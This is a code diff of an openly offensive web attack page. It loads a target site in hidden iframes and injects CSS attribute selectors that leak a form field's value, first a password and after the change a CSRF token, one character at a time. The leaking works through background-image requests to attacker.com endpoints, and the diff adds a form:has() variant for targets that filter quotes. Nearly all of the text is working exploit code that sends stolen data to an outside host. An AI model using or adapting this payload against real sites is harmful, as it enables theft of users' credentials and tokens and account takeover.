@@ -21,16 +21,16 @@
     </body>
     <script>
         /* ==== CONFIG ==== */
-        const RURL = "http://vulnerable.com/targets/password.php?color=red;}";  
+        const RURL = "http://attacker.com/targets/hidden.php?color=red;}";  
         const LURL_KNOWNCHARS = "http://attacker.com/knownChars.php";
         const LURL_LEAKCHAR = "http://attacker.com/leak.php?char=";
         const HTML_ELEMENT_NAME = "input";
         const HTML_ATTRIBUTE_NAME = "name";
-        const HTML_ATTRIBUTE_VALUE = "password";
-        const isHiddenTypeElement = false;
-        const isQuoteFiltered = false;
+        const HTML_ATTRIBUTE_VALUE = "csrf-token";
+        const isQuoteFiltered = true;
         /********************/
 
+        // Separate chars because of 414 URI too long
         const CHARS_1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".split("");
         const CHARS_2 = "abcdefghijklmnopqrstuvwxyz".split("");
         const CHARS_3 = "0123456789".split("");
@@ -53,13 +53,12 @@
                 // Append the chars with the known chars
                 css = build_css(CHARS[i].map(v => known + v));
 
-                // Create an iframe to try the attack. If `X-Frame-Options` is blocking this you could use a new tab...
+                // Create an iframe to try the attack.
                 frame = document.createElement("iframe");
                 frame.src = RURL + css;
                 frame.style="visibility: hidden;"; //gotta be sneaky sneaky like
                 document.getElementById("frames").appendChild(frame);
 
-                // timer stuff because we want to be l33t
                 clearInterval(timer);
                 target_time = new Date();
                 target_time.setSeconds(target_time.getSeconds() + 1);
@@ -70,7 +69,7 @@
                 }, 50);
             }
 
-            // in 3 seconds, after the iframe loads, check to see if we got a response yet
+            // in 1 seconds, after the iframe loads, check to see if we got a response yet
             setTimeout(function() {
                 var oReq = new XMLHttpRequest();
                 oReq.addEventListener("load", known_listener);
@@ -82,38 +81,19 @@
         function build_css(values) {
             css_payload = "";
             for(var value in values) {
-                if(isHiddenTypeElement) {
-                    if(isQuoteFiltered) {
-                        css_payload += "" + HTML_ELEMENT_NAME + "[" + HTML_ATTRIBUTE_NAME + "=" + HTML_ATTRIBUTE_VALUE + "][value^="
-                        + values[value]
-                        + "]~*{background-image:url(" + LURL_LEAKCHAR 
-                        + values[value]
-                        + ")%3B}"; //can't use an actual semicolon because that has a meaning in a url
-                    }
-                    else {
-                        css_payload += "" + HTML_ELEMENT_NAME + "[" + HTML_ATTRIBUTE_NAME + "=" + HTML_ATTRIBUTE_VALUE + "][value^='"
-                        + values[value]
-                        + "'']~*{background-image:url(" + LURL_LEAKCHAR 
-                        + values[value]
-                        + ")%3B}"; //can't use an actual semicolon because that has a meaning in a url
-                    }
-
+                if(isQuoteFiltered) {
+                    css_payload += "form:has(" + HTML_ELEMENT_NAME + "[" + HTML_ATTRIBUTE_NAME + "=" + HTML_ATTRIBUTE_VALUE + "][value^="
+                    + values[value]
+                    + "]){background-image:url(" + LURL_LEAKCHAR 
+                    + values[value]
+                    + ")%3B}"; //can't use an actual semicolon because that has a meaning in a url
                 }
                 else {
-                    if(isQuoteFiltered) {
-                        css_payload += "" + HTML_ELEMENT_NAME + "[" + HTML_ATTRIBUTE_NAME + "=" + HTML_ATTRIBUTE_VALUE + "][value^="
-                        + values[value]
-                        + "]{background-image:url(" + LURL_LEAKCHAR 
-                        + values[value]
-                        + ")%3B}"; //can't use an actual semicolon because that has a meaning in a url
-                    }
-                    else {
-                        css_payload += "" + HTML_ELEMENT_NAME + "[" + HTML_ATTRIBUTE_NAME + "=" + HTML_ATTRIBUTE_VALUE + "][value^='"
-                        + values[value]
-                        + "']{background-image:url(" + LURL_LEAKCHAR 
-                        + values[value]
-                        + ")%3B}"; //can't use an actual semicolon because that has a meaning in a url
-                    }
+                    css_payload += "" + HTML_ELEMENT_NAME + "[" + HTML_ATTRIBUTE_NAME + "=" + HTML_ATTRIBUTE_VALUE + "][value^='"
+                    + values[value]
+                    + "'']~*{background-image:url(" + LURL_LEAKCHAR 
+                    + values[value]
+                    + ")%3B}"; //can't use an actual semicolon because that has a meaning in a url
                 }
             }
             return css_payload;
